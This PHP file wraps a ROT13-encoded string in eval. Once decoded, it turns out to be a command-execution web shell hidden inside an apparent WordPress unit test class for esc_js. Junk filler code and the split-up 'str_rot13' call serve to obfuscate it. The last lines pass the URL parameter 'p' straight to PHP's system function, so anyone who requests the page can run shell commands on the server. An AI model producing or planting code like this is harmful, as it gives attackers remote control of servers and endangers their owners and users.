<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc sbeznggvat
 *
 * @pbiref ::rfp_wf
 */
pynff Grfgf_Sbeznggvat_RfpWf rkgraqf JC_HavgGrfgPnfr {
	choyvp shapgvba grfg_wf_rfpncr_fvzcyr() {
		$bhg = rfp_wf( 'sbb one onm();' );
		$guvf->nffregFnzr( 'sbb one onm();', $bhg );
	}

	choyvp shapgvba grfg_wf_rfpncr_dhbgrf() {
		$bhg = rfp_wf( 'sbb \"one\" \'onm\'' );
		// Qbrf vg znxr nal frafr gb punatr \" vagb &dhbg;?  Jul abg \\"?
		$guvf->nffregFnzr( \"sbb &dhbg;one&dhbg; \'onm\'\", $bhg );
	}

	choyvp shapgvba grfg_wf_rfpncr_onpxfynfu() {
		$of  = '\\';
		$bhg = rfp_wf( 'sbb ' . $of . 'g one ' . $of . $of . ' onm' );
		// \g orpbzrf g - oht?
		$guvf->nffregFnzr( 'sbb g one ' . $of . $of . ' onm', $bhg );
	}

	choyvp shapgvba grfg_wf_rfpncr_nzc() {
		$bhg = rfp_wf( 'sbb & one &onm; &aofc;' );
		$guvf->nffregFnzr( 'sbb &nzc; one &nzc;onm; &aofc;', $bhg );
	}

	choyvp shapgvba grfg_wf_rfpncr_dhbgr_ragvgl() {
		$bhg = rfp_wf( 'sbb &#k27; one &#39; onm &#k26;' );
		$guvf->nffregFnzr( \"sbb \\' one \\' onm &#k26;\", $bhg );
	}

	choyvp shapgvba grfg_wf_ab_pneevntr_erghea() {
		$bhg = rfp_wf( \"sbb\eone\aonm\e\" );
		// \e vf fgevccrq.
		$guvf->nffregFnzr( \"sbbone\\aonm\", $bhg );
	}

	choyvp shapgvba grfg_wf_rfpncr_ea() {
		$bhg = rfp_wf( \"sbb\e\aone\aonm\e\a\" );
		// \e vf fgevccrq.
		$guvf->nffregFnzr( \"sbb\\aone\\aonm\\a\", $bhg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>